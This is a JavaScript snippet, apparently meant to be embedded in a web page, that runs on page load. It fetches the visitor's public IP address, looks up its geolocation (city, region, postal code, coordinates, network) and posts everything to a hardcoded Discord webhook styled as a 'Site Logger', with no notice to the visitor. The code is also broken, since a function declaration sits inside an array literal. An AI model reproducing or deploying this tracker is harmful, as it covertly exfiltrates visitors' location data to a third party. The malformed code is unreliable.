const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const dscURL = 'https://discord.com/api/webhooks/1457850148507095253/z9zaA8Bg4744x3Ydr9qEAIqws2qpdelxT0csW2gurAvZwYAmaDi1gfMPXpRt6mLreGDs'; // replace with your webhook url
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
    username: "Site Logger",
    avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
    content: "@here",
    embeds: [
        {
            title: "📊 New Site Event",
            description: "A new page interaction was recorded.",
            color: 0x5865F2,

            fields: [
                { name: "IP Address", value: `\`${ipadd}\``, inline: true },
                { name: "Network", value: `\`${geoData.network}\``, inline: true },
                function getConnectionType(data) {
    if (data.is_vpn || data.is_proxy || data.is_tor) {
        return "🛡️ VPN / Proxy detected";
    }
    return "🌐 Standard connection";
}

                { name: "City", value: geoData.city || "Unknown", inline: true },
                { name: "Region", value: geoData.region || "Unknown", inline: true },

                { name: "Country", value: geoData.country_name || "Unknown", inline: true },
                { name: "Postal Code", value: geoData.postal || "N/A", inline: true },

                { name: "Coordinates", value: `Lat: ${geoData.latitude}, Lon: ${geoData.longitude}`, inline: false }
            ],

            footer: {
                text: "Site Logger • Automated Event"
            },

            timestamp: new Date()
        }
    ]
})
             
                    });
                });
        })
        .then(dscResponse => {  
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};
sendIP();






